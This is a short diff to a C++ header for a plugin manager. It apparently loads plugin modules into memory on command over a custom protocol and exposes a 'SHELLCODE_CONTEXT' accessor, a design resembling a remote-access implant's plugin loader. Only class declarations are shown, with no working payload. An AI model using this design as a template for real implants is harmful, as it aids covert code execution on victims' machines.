@@ -14,9 +14,12 @@ class DArray;
 class PluginInterface;
 class plugin{
     public:
+        plugin();
+        ~plugin();
         ulong ID;
         MEMORYMODULE Module;
         PluginInterface* plugInterface;
+        HANDLE hThread;
 };
 class PluginManagerInterfacePrivate;
 class RPEP;
@@ -28,7 +31,7 @@ class PluginManager{
         PluginManager();
         ~PluginManager();
 
-        bool loadPlugin(RPEP_LOAD_PLUGIN *pluginModule);
+        bool loadPlugin(RPEP_LOAD_PLUGIN *pluginModule,DArray& response);
         bool unload(ushort ID);
         bool initPlugin();
         bool stopPlugin();
@@ -42,6 +45,7 @@ class PluginManager{
         bool runPluginCMD(ulong pluginID,char* data,uint size);
         plugin* getPluginById(ulong id);
         RPEP* getProtocol();
+        SHELLCODE_CONTEXT* getContext();
 
         static int pluginThread(void*);
 };
